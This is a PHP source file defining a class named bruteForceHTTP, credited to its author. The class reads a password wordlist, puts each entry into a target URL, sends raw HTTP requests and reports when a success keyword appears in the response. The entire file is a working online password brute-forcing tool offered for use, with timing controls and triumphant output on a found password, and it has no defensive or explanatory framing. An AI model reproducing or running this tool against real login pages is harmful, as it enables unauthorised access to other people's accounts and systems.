<?php
/*
create by jamesjara
23 de mayo
james jara
jamesjara.com

computer society latam, costa rica

*/
class bruteForceHTTP {

	const log_info  = "Info";
	
	private static $instance;

	protected   $DICTIONARY_FILE 	= null,
					$timeout  			= 	null,
					$AccessUrl			=	null,
					$BingoKeyword		=	null;
	
	
	public function __construct(){}
	public function __clone(){}
	public function __wakeup(){}
	
	public static function getInstance(){
		if(!self::$instance){
			self::$instance = new self();
		}
		return self::$instance;
	}

	public function setDebug($value ){
		$this->debug = (($value==true) ? true : false);
	}

	private function _log($msg, $severity) {
		if( $severity != bruteForceHTTP::log_info && ($this->debug!=true) ) {
			//return;
		}
		echo sprintf( "%s : %s \n", $severity, $msg );
	}
	
	public function setDictionary($value ){
        if(empty($value)) throw new Exception(' Dictionary is invalid ');
        if(!is_readable($value)) throw new Exception(' Dictionary  is not readable ');
        $this->DICTIONARY_FILE   = $value;		
	}
	
	public function setTimeOut($value){
        if(empty($value) &&!is_numeric($value)) throw new Exception(' timeout is invalid ');
        $this->timeout   = $value;			
	}
	
	private function TimeOut(){
		if($this->timeout){
			$this->_log( sprintf('sleeping %s seconds ', $this->timeout ) , bruteForceHTTP::log_info );
			sleep($this->timeout);
		}
	}
	
	public function setAccessUrl($value ){
        if( stripos($value,"{password}") === false ) throw new Exception(' {password} Comodin is requerid ');	
        $this->AccessUrl   = $value;		
	}
	
	public function setBingoKeyword($value ){
		 if(empty($value)) throw new Exception(' BingoKeyword is invalid ');
		 $this->BingoKeyword = $value ;
	}
	
	private function request($value){
		$this->_log( sprintf(' > connecting to %s ', $value  ) , bruteForceHTTP::log_info );
		$url = parse_url($value);
		if ($url['scheme'] != 'http') {
			throw new Exception('Error: Only HTTP request are supported ! ');
		}
		$host = $url['host'];
		$fp = fsockopen($host, 80, $errno, $errstr, 30);
		if ($fp){
			// send the request headers:
			fputs($fp, "POST $value HTTP/1.1\r\n");
			fputs($fp, "Host: $host\r\n");
			//todo: hability to ADD $referer  if ($referer != '')  fputs($fp, "Referer: $referer\r\n");
			fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
			//todo: hability to add POST DATA. fputs($fp, "Content-length: ". strlen($data) ."\r\n");
			fputs($fp, "Connection: close\r\n\r\n");
			//todo: hability to add POST DATA.  fputs($fp, $data);
			$result = '';
			while(!feof($fp)) $result .= fgets($fp, 128);
		} else return false;			
		fclose($fp);
		$result = explode("\r\n\r\n", $result, 2);
		$header = isset($result[0]) ? $result[0] : '';
		$content = isset($result[1]) ? $result[1] : '';
		return $content;
	}
	
	private function tryPassword($value ){
		$url = str_ireplace('{password}', $value  , $this->AccessUrl );
		$result = $this->request($url);
		if($result!=false){
			if (preg_match("/$this->BingoKeyword/i", $result )) 
				return true;
			else
				return false;				
		} 
		$this->_log( sprintf(' Error requesting the url %s ', $url  ) , bruteForceHTTP::log_info );
		return false;
	}
	
	public function KillerTime(){

		if(!$this->DICTIONARY_FILE)  	throw new Exception(' Set Dictionary first ');
		if(!$this->AccessUrl)  			throw new Exception(' Set AccessUrl first ');
		if(!$this->BingoKeyword)  		throw new Exception(' Set BingoKeyword first ');
		
		$this->_log(' Reading dictiory ', bruteForceHTTP::log_info );
		$handle	 = fopen($this->DICTIONARY_FILE,'rb');
		$contents = fread($handle, filesize($this->DICTIONARY_FILE));
		$passwords = explode("\n",$contents);		

		$this->_log( sprintf(' %s passwords found ',count($passwords)) , bruteForceHTTP::log_info );
		$count = 1;
		foreach( $passwords as $val ){
			//FOR EACH PASSWORD EXECUTE A HTTP
			if($this->tryPassword( $val )){
				echo sprintf("///////////////////////////////////////// \n///////////////////////////////////////// \n // count: %s\t waala! Password F0und: %s \n///////////////////////////////////////// \n ///////////////////////////////////////// \n " , $count ,  $val );	
				exit();			
			} else
				echo sprintf("count: %s\t hmm! Wrong password: %s  \n" , $count ,  $val );
			$this->TimeOut();		
			$count++;	
		}
	}
	
}

